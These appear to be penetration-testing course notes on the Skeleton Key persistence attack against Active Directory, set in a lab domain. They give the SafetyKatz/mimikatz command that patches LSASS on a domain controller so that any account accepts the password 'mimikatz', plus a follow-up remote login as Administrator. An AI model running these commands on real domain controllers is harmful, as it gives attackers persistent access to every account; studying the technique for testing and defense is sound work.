- The Skeleton key attack should be considered a Proof-of-Concept, and should not be used in real-life engagements, because:
	- It is an impractical concept.
	- It is not OPSEC safe. (We are literally downgrading the security of the target environment, especially within the Assumed Breach scenario)
	- It is known to cause issues with AD CS.
- Skeleton key is a persistence technique where it is possible to inject a Skeleton key in the LSASS process of the DC, so that it allows access as any user with a single password.
- All the publicly known methods are NOT persistent across reboots.

#### Performing a Skeleton Key Attack
- We can use the command given below to inject a skeleton key (with the password "mimikatz") on any DC of our choice:
	- `SafetyKatz.exe '"privilege:debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
- Now it is possible to access any machine with a valid username and the password "mimikatz".
	- `Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator`
- DA privileges are required to perform this attack.